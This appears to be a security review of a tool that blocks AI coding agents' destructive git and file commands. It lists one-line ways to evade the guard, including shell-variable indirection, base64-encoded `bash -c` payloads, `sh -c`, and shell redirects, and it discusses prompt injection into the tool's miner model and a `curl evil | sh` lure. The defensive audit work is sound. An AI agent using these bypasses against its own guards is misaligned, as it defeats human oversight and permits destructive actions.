# VibeBloat — Chief Security Officer Review

**Reviewer persona:** CSO / offensive security lead. Lens: this is a *security* product whose entire value proposition is "deterministically BLOCK dangerous shell/file commands before they run, and scrub secrets before history reaches a model." I hold it to a security-efficacy bar, not a demo bar. A guard that *looks* like it blocks but doesn't is worse than no guard, because it manufactures false confidence.

**Verdict up front:** Genuinely sophisticated engineering with real fail-closed thinking in places — but the enforcement layer is bypassable by a motivated agent in several one-liners, one whole guard *class* (file guards) is near-cosmetic, and the marquee "signed release" supply-chain feature is non-functional as shipped. For a deterministic-blocking security tool, that combination caps the grade.

---

## 1. Can the guard be bypassed? (yes — multiple, some trivial)

### FINDING H-1 — Shell redirection bypasses the entire *file* guard class (HIGH)
File-chokepoint guards (e.g. `mcp-config-wrong-file`, `guards.ts:33-48`) only ever fire from a structured file-tool input or an `apply_patch` payload. See `hooks.ts:27-37`: a `file` event is only synthesized when `toolName === "apply_patch"` or a `file_path`/`path` field is present. The matcher itself (`match.ts:159-164`) compares only the **basename** of that path.

There is **no shell-level interception of file writes.** An agent that writes the protected file through the shell — `echo '{}' > config/.mcp.json`, `tee`, `cp`, `mv`, `printf ... >>`, `python -c "open('.mcp.json','w')..."`, `sed -i` — produces a `shell` event, and no *shell* guard matches it. The "block dangerous file commands" claim is therefore satisfied only for agents that (a) support native hooks and (b) happen to use the file tool. Any agent with a shell can write any "protected" file at will. For a product that advertises file-content guards, this is a load-bearing gap.

Corollary: even on the file path, `match.ts:160` strips the event path to its basename before comparing to `guard.match.path`. A guard authored with a repo-relative `path` like `config/.mcp.json` (exactly the miner's documented output format, `model-command-input.ts:57`) can never equal a bare basename, so it silently never fires. The only reason the built-in guard works is that its `path` is coincidentally the bare `.mcp.json` (`guards.ts:41`).

### FINDING H-2 — Unexported shell-variable indirection bypasses command guards (HIGH)
`normalizeCommand` (`match.ts:37-57`) expands `$VAR` / `${VAR}` **only** from `event.variables` or `process.env`, falling back to the literal token if neither has it (`match.ts:52`). In the real enforcement path the shim passes **no** `variables` (`shell-shim-handler.ts:51`, `shell-shim.ts:6` construct the event as `{chokepoint, command}` only). Shell variables set in the same session but **not exported** never appear in a child process's `process.env`.

Result: `F=--force; git push $F` — the arg stays the literal string `$F`, `argMatches` looks for `--force`, no match, `git-*` force guards do not fire, `push --force` runs. Same for `S=stash; git $S -u`, `H=--hard; git reset $H`. This is a clean, one-line bypass of the flagship destructive-command guards using nothing but standard shell semantics. Env-var indirection *helps* the guard only in the narrow case where the attacker bothered to `export`.

### FINDING H-3 — Encoding / eval / nested-shell indirection (HIGH, partly inherent)
`shellCommands` (`match.ts:132-147`) walks the tree-sitter parse and inspects tokens of `command` nodes. Anything where the real binary is an *argument string* rather than a parsed command word is invisible:
- `bash -c "$(echo Z2l0IHB1c2ggLS1mb3JjZQ== | base64 -d)"`
- `sh -c 'git reset --hard'`
- `eval "$CMD"`, `xargs`, `env git push --force` (leading `env` makes `env` the binary)

The guard sees `bash`/`sh`/`eval` as the binary and the payload as one opaque word. This is a fundamental limitation of command-shape matching, but it is fatal for a threat model that includes an adversarial or compromised agent, and the product markets itself as protection against exactly that class of mistake-at-machine-speed. At minimum it should be documented as out of scope; it is not.

### FINDING M-4 — Only Class A fails closed; B/C/D fail OPEN on parse error (MEDIUM)
`parseErrorVerdict` (`match.ts:149-154`) returns `{fired:false}` for any non-A guard. `hasObviousSyntaxError` (`match.ts:89-102`) or a tree-sitter error therefore *disables* every Class B/C/D guard for that command. An attacker appends a syntactically-poisoning fragment (an unbalanced quote in a `#`-style trailing comment, an unclosed `$(`) to slide a misconfig/environment command past its guard. Fail-open is defensible for "wrong result" advisories; it is the wrong default for anything a security product enforces, and it is reachable by attacker-controlled input.

### FINDING L-5 — Chained git aliases resolved only one level (LOW)
`match.ts:179-185` expands `candidate.args[0]` through the alias table once and re-splices, but never re-resolves the expansion. `[alias] p = push` + `[alias] yolo = p --force` means `git yolo` expands to `p --force`, and `p` is never re-expanded to `push`, so a `git push --force` guard misses it. Niche (requires attacker-authored local git config) but it defeats the alias-normalization that the code went to real trouble to build.

### What they got RIGHT (credit where due)
- `git.exe`/`git.cmd` normalization (`match.ts:33-35`) and alias detection over `git.exe` (`git-aliases.ts:99`) — the `git.exe` vs `git` bypass is closed.
- Bundled short flags: `argMatches` (`match.ts:26-31`) catches `git stash -au`, not just `-u` — a bypass most implementations miss.
- Whole-tree pathspec after `--` (`match.ts:192-197`): `git checkout -- .` / `:/` / `./` are treated as unscoped and still fire, while `-- somefile` correctly scopes out. Thoughtful.
- Global-option stripping `-C`/`-c`/`--git-dir` (`match.ts:14-24`) so `git -C /repo push --force` still matches.
- Class A fail-closed on parse error, and shim guard-evaluation errors return exit 2 (`shell-shim-handler.ts:63-66`) — enforcement fails **closed** when the evaluator throws. Good.

### Meta-bypass (architectural)
A PATH shim only intercepts PATH resolution. `/usr/bin/git push --force` (absolute path), an agent's built-in/library git, or any agent that supports neither native hooks nor the PATH shim is entirely unprotected. Enforcement coverage is a function of *how* the agent spawns processes, which the product cannot guarantee. This is inherent to the shim approach but materially narrows the real-world protected surface and is not surfaced to the user.

---

## 2. Is the secret-scrubbing sound before data hits a model? (mostly, with a real gap)

The pipeline (`fail-closed.ts:17-31`) is well-structured: presidio-style redact, then an independent gitleaks-style pass that **throws** on a surviving secret, and on any throw it diverts the raw payload to a local-only sink and pauses ingest — genuine fail-closed behavior. JSON-value-only redaction (`builtin.ts:110-130`) avoiding structure corruption, and redacting on *key name* even when the value looks innocuous (`builtin.ts:122`), are both correct and show the author hit these problems against real transcripts.

### FINDING M-6 — Fail-closed guarantee only covers KNOWN shapes (MEDIUM)
The comment at `builtin.ts:163-167` claims the second pass is "a BROADER net than the redactor, never a subset." It is not. `survivingSecret` (`builtin.ts:169-176`) is a fixed regex list of known token shapes and **omits the entropy heuristic entirely.** So the only secrets the fail-closed check actually guarantees are the ones already named by pattern. A credential that is (a) shorter than the 24-char entropy floor (`HIGH_ENTROPY_MIN_LENGTH`, `builtin.ts:14`), (b) below 3.5 bits/char, or (c) simply an unknown vendor shape, is neither redacted by the entropy pass nor caught by the "independent" pass — it flows to the model silently. Examples: a 20-char hex API key with no keyword; a raw JWT (dots split the entropy candidate `builtin.ts:79` into sub-24 segments) when not prefixed with `Bearer`. The scrubber is good, but the *guarantee* the code advertises is narrower than the comment states, and for a privacy-first security tool that overstatement matters.

Minor: the entropy candidate excludes `/` (`builtin.ts:78-79`) to avoid swallowing paths, which also means slash-bearing secrets are only length-checked per segment.

---

## 3. Supply-chain / signing story: real or theater? (theater, as shipped)

**As cloned, the signed-release path can never succeed and cannot be verified by anyone.** `release/metadata.json` references three artifacts — `dist/vibebloat-windows-x64.exe`, `release/vibebloat-windows-x64.bundle`, `release/vibebloat.pub` — and **all three are absent/gitignored** (`.gitignore`: `dist/`, and the pub/bundle/exe are simply not committed). `git ls-files release/` returns only `README.md` and `metadata.json`. `resolveControlledScrubberCommands` (`controlled-release.ts`) therefore throws `ControlledScrubbersUnavailableError` at the `existsSync`/`isFile` check, and `resolveScrubbers` (`resolve.ts:28-45`) **swallows the error** and silently drops to the builtin tier. Every clone, every npm install, every CI run gets the in-process scrubber; the cosign path is dead code in practice.

The cryptographic design itself is *reasonable* — pinned SHA-256 of the public key (`sigstore.ts:59`, hardcoded again at `controlled-release.ts:22`), relative-path containment against traversal (`sigstore.ts:19-24`, `controlled-release.ts` `containedAbsolutePath`), a binary self-probe, and rejection of env-var scrubber overrides that don't match the signed binary. But note two things:
1. **`verifySigstore` trusts the caller-supplied key file** (`sigstore.ts:58-66`): it fingerprints whatever `publicKey` bytes it is handed and compares to `metadata.publicKeySha256` — but `metadata` is read from the *same untrusted release directory*. The only real anchor is the SHA-256 constant baked into the source (`controlled-release.ts:22`). So the trust root is "an attacker who can replace the release dir cannot also recompile the shipped source." For an npm tarball that ships JS, that's a weak anchor — swap the pin and the artifacts together and verification passes. This is standard "pinned-in-source" TOFU, not a Sigstore transparency-log / keyless-identity verification, despite the cosign branding.
2. The RED FLAG holds: the **encrypted private key `release/vibebloat.key` is present on disk** (correctly gitignored, `.gitignore: release/*.key`, and confirmed untracked) while the *public* half is missing — inverted from what a verifiable release needs. Good that the private key isn't committed; bad that the net effect is "private key on the author's disk, nothing a downstream user can verify."

Net: the signing story is **presentation, not protection**, for anyone who obtains the code. The honest posture would be to either ship the pub+bundle+exe (so `vibebloat doctor` can actually verify) or stop advertising a signed tier. The silent downgrade in `resolve.ts` also means a user who *believes* they're on the pinned/signed scrubber has no hard signal they're not (only a soft `signedUnavailableReason` and a tier notice string, `resolve.ts:47-53`).

---

## 4. Fail open or closed on error? (mixed, but the important paths fail closed)

- Shim guard-evaluation throw → exit 2 (block). **Closed.** (`shell-shim-handler.ts:63-66`)
- Class A parse error → block. **Closed.** (`match.ts:150-152`)
- Scrub throw → local sink + ingest paused. **Closed.** (`fail-closed.ts:24-27`)
- Class B/C/D parse error → allow. **Open.** (`match.ts:153`) — see M-4.
- Signed-tier unavailable → silent downgrade to builtin. **Open-ish** (still scrubs, but not the promised tier, and quietly). (`resolve.ts:37-44`)
- Live-incident capture failure → command proceeds, proposal skipped. **Open** by design (observation only, enforcement unchanged). (`shell-shim-handler.ts:74-91`)

The destructive-action and secret-egress paths fail closed, which is the right prioritization. The gaps are in the advisory/misconfig tiers and the supply-chain tier.

---

## 5. Prompt-injection from untrusted session history into the miner (MEDIUM, contained)

The miner feeds the developer's own (scrubbed) history to a model with a fixed instruction block (`model-command-input.ts:42-71`) that is then wrapped as a system message with the candidates as a user message (`buildChatCompletionsBody:92-102`). History is not trustworthy input — an agent may have processed hostile web content, or a transcript may be deliberately poisoned. The `INSTRUCTIONS` contain **no injection defense** (no "the following is untrusted data," no delimiter discipline, no output constraint beyond "return JSON").

Blast radius, however, is contained, and the design shows awareness:
- Semantic context is explicitly typed `UntrustedSemanticContext` and validated (`model-pass.ts:2,8`, `model-command-input.ts:77-79`).
- Model output compiles only to **local block/warn guards** — an injection's best outcome is a bogus blocking guard (local DoS / suppressing a legitimate command) or a suppressed real incident. It cannot exec or exfiltrate: `publish` is a local sink (`fail-closed.ts:9,29`).
- Block receipts are aggressively sanitized (`block-receipt.ts:15-32`): strips CR/LF, ANSI/control chars (`[^\x20-\x7e]`), redacts tokens/paths/emails, length-caps. So an injected `remediation`/`condition` cannot smuggle ANSI or a `curl evil | sh` lure into the user's terminal as cleanly as I first expected — the non-printable strip and token redaction blunt it. Good.
- Live incidents require explicit human approval before enforcement (`shell-shim-handler.ts:84-86`, `vibebloat approve-live`).

Residual risk: a plausibly-worded injected `remediation` (plain ASCII, e.g. "run `git config --global ...` to fix") could still socially-engineer the developer, and an injected incident could create a nuisance guard in the batch/auto path if that path lacks the live path's approval gate. Medium, not high, given no code-exec/exfil primitive.

---

## Scores

### Build Week Criterion #1 — Technological Implementation (security lens): **7 / 10**
The engineering depth is real and above hackathon median: tree-sitter bash parsing, git alias resolution from actual config, global-option stripping, bundled-flag detection, whole-tree pathspec reasoning, tiered fail-closed scrubbing, typed untrusted context, sanitized receipts, 702 passing tests. This is not vaporware. It loses three points because, judged *as a security control*, the enforcement is bypassable with standard shell one-liners (H-1, H-2, H-3), a whole guard class is near-cosmetic (H-1), and the headline supply-chain feature does not function as shipped (§3). Sophisticated ≠ effective, and for a blocker the delta matters.

### SECURITY POSTURE GRADE: **C**
Rationale: The high-value egress and destructive-command paths fail closed and show genuine defensive craft — that keeps it out of D territory. But a product marketed as *deterministic blocking* that can be defeated by `sh -c`, an unexported shell variable, or a shell redirect to the "protected" file has an efficacy problem it does not disclose, and its cryptographic supply-chain assurance is non-functional and (as branded) overstated. A security tool must be honest about what it does *not* catch; this one's marketing surface exceeds its actual guarantees. Fixable — most of these are one-fix items (add a shell-write file-interception layer, resolve `$VAR` conservatively or fail-closed on unresolved vars in Class A, ship the verifiable release artifacts, make the tier downgrade loud) — but today it's a C.

---

## Top remediations (priority order)
1. **Intercept file writes at the shell layer** (or drop the file-guard marketing). A `git`-only shim plus file-tool hooks leaves `echo>`, `tee`, `cp`, `python -c` wide open. (H-1)
2. **Class A: fail closed on unresolved `$VAR`** instead of leaving the literal token. An unexpanded variable in a destructive command is a reason to block/deny, not to allow. (H-2)
3. **Ship the pub key + bundle + exe, or stop advertising a signed tier.** Make `resolve.ts`'s downgrade a loud, user-visible warning, not a swallowed error. (§3)
4. **Make the second scrub pass a true superset** — include the entropy heuristic, or state plainly that fail-closed covers known shapes only. (M-6)
5. **Document the encoding/`sh -c`/absolute-path bypass class** as explicitly out of scope, and add an injection-defense preamble + delimiting to the miner instructions. (H-3, §5)

---

HACKATHON-WIN LIKELIHOOD (1st place): 52/100
